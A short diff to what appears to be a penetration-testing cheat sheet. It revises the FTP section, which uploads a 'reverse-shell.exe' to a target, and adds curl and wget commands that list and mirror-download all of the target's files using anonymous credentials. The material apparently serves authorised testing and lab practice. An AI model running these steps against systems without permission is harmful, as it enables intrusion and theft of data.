@@ -35,9 +35,7 @@ sudo nmap $TARGET -sV -sC -p$PORTS -oN scans/$TARGET-nmap-versions
 
 ### FTP
 ```bash
-ftp $TARGET
-# anonymous
-# password
+ftp $TARGET $PORT # anonymous:anonymous
 pwd
 
 ls
@@ -47,6 +45,16 @@ binary
 put reverse-shell.exe
 
 exit
+```
+
+List files on target
+```bash
+curl ftp://anonymous:anonymous@$TARGET:21
+```
+
+Download all files to current directory.
+```bash
+wget -m ftp://anonymous:anonymous@$TARGET:21 -nd
 ```
 
 ### SSH
